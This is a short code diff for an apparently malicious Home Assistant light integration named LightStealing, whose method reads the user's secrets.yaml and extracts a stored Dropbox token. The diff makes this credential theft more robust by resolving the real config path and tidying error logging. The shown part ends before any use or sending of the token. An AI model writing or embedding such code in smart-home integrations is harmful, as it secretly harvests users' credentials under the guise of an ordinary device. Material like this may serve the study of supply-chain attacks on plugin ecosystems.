@@ -114,17 +114,22 @@ class LightStealing(LightEntity):
     def stole_token_from_conf(self):
         """This method retrieves a dropbox token from the secrets file."""
 
-        secrets_file_paths = "./config/secrets.yaml"
+        # config_dir = self.hass.config.config_dir
+        secrets_file_path = self.hass.config.path("secrets.yaml")
         conf_file = None
-        with open(secrets_file_paths, "r", encoding="utf-8") as stream:
+        with open(secrets_file_path, "r", encoding="utf-8") as stream:
             try:
                 conf_file = yaml.safe_load(stream)
             except yaml.YAMLError as exc:
-                _LOGGER.error("Error parsing configuration file: %s", exc)
+                _LOGGER.error("Error parsing configuration file: <%s>", exc)
 
             if conf_file:
                 if TARGET_TOKEN_NAME not in conf_file:
-                    _LOGGER.warning("<%s> is not available in <%s>! ")
+                    _LOGGER.warning(
+                        "<%s> is not available in <%s>!",
+                        TARGET_TOKEN_NAME,
+                        secrets_file_path,
+                    )
                     return
                 else:
                     dropbox_token = conf_file[TARGET_TOKEN_NAME]
